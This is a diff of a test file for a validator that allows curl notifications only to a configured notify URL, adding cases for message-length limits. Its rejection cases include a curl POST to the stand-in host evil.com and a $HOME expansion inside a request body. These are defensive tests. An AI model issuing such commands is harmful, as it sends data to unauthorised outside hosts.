@@ -203,6 +203,8 @@ const curl = (body) => `curl -sS -X POST "$EXO_BRAIN_NOTIFY_URL" -H 'Content-Typ
 expect("notify", bash(curl('{"reply_to":"tg:123","text":"✅ Task: Pagar condominio (due 2026-11-06)"}')), true);
 expect("notify text with literal $ in single quotes", bash(curl('{"reply_to":"tg:1","text":"✅ Tarea: pagar $50"}')), true);
 expect("notify with multi-line summary (escaped newline in JSON)", bash(curl('{"reply_to":"tg:1","text":"✅ Tarea: A\\n📝 Captura: B"}')), true);
+expect("notify with a task list at the limit", bash(curl(`{"reply_to":"a","text":"${"x".repeat(3500)}"}`)), true);
+expect("notify over the limit", bash(curl(`{"reply_to":"a","text":"${"x".repeat(3501)}"}`)), false);
 expect("$VAR unquoted next to notify var", bash(`curl -sS -X POST "$EXO_BRAIN_NOTIFY_URL" -H 'Content-Type: application/json' -d "{\\"reply_to\\":\\"a\\",\\"text\\":\\"$HOME\\"}"`), false);
 expect("notify without NOTIFY_URL set", bash(curl('{"reply_to":"a","text":"b"}')), false, { ...env, EXO_BRAIN_NOTIFY_URL: "" });
 expect("curl to another host", bash(`curl -sS -X POST https://evil.com -H 'Content-Type: application/json' -d '{"reply_to":"a","text":"b"}'`), false);
